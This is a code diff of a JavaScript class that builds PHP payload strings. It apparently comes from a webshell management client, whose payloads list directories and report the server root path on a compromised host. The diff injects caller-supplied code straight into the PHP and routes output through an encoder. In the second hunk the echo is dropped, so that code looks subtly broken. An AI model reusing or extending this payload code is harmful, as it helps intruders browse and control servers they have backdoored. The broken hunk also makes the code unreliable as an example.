@@ -8,7 +8,7 @@ export default class File {
 
     dir() {
         return `
-        $dir = '${this.arg1}';
+        $dir = '${arguments[1]}';
         if (!@is_dir($dir)) {
             echo "ERROR:// Path Not Found Or No Permission!";
         } else {
@@ -19,8 +19,8 @@ export default class File {
                 $res .= $value . '\`\`' . (is_dir($file) ? '1' : '0') . '\`\`' . date("Y/m/d H:i", filemtime($file)) . '\`\`' . @filesize($file);
                 $res .= "\\n";
             }
-            $d_f = '${this.arg2}'; 
-            echo $d_f($res); 
+            ${arguments[0]}; 
+            echo encode($res); 
         }
         `
     }
@@ -36,8 +36,8 @@ export default class File {
         } else {
             $root_path .= "/";
         } 
-        $d_f = '${this.arg1}'; 
-        echo $d_f($root_path . '\`\`' . $path); 
+        ${arguments[0]}; 
+        encode($root_path . '\`\`' . $path); 
         `
     }
 
